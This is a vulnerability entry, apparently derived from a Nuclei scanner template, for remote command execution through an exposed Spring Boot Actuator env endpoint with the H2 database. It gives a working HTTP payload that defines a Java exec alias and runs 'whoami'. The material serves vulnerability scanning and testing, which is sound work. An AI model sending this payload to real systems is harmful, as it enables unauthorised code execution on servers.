# Nuclei Template: Spring Boot H2 Database - Remote Command Execution
**Template ID:** springboot-h2-db-rce
**Vulnerability Class:** OS Command Injection
**Severity:** Critical
**CWE:** CWE-78
**Source:** Nuclei Template (`springboot-h2-db-rce.yaml`)

## Vulnerability Information & PoC

## Description
Spring Boot H2 Database is susceptible to remote code execution.

## Steps to reproduce / Exploit Payload
```http
POST /actuator/env HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{
  "name":"spring.datasource.hikari.connection-test-query",
  "value":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('whoami');"
}
```

## References
- https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database
- https://twitter.com/pyn3rd/status/1305151887964946432
- https://www.veracode.com/blog/research/exploiting-spring-boot-actuators
- https://github.com/spaceraccoon/spring-boot-actuator-h2-rce
